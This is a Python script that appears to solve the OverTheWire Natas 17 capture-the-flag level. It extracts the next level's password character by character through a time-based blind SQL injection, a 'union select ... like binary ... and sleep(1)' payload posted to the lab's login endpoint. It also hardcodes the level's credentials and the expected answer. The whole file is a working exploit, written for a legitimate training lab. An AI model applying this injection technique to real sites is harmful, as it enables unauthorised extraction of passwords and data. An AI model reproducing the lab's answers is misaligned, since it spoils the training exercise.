from datetime import datetime
import requests
import sys

def extract(url,username,password,flag):
    alpha_num = "123456789NabcdefghijklmnopqrstuwvxyzABCDEFGHIJKLMOPQRSTUVWXYZ0" 
    letter = 0
    while letter < len(alpha_num):
        start_time = datetime.now()
        post_data = {
            "username":"\" union select 1,2 from users where password like binary '"+ flag + alpha_num[letter] + "%' and sleep(1)-- -",
            }
        sqli_r = requests.post(url,auth=(username,password),data=post_data)
        end_time = datetime.now()
        difference = end_time - start_time
        if difference.total_seconds() > 1 and difference.total_seconds() < 2:
            flag = flag + alpha_num[letter]
            letter = 0
        else:
            sys.stdout.write(f"\rExtracting flag: {flag}{alpha_num[letter].ljust(20)}")
            sys.stdout.flush()
            letter += 1
            
    if flag != "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq": #Takes care of the false positives due to slow connections during the query.
        last = 1
        print("\rSomething went wrong. Re-starting from known position.".ljust(20))
        while True:
            if not flag in "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq":
                flag = flag[:-int(last)]
                last += 1
            else:
                break
        extract(url,username,password,flag)
    else:
        print(f"\rThe flag for natas17 is:  {flag.ljust(20)}") 

if __name__=="__main__":
    print("Natas 17: Time based SQL Injection. Patience...")
    url = "http://natas17.natas.labs.overthewire.org/"
    username = "natas17"
    password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
    flag = ""
    extract(url,username,password,flag)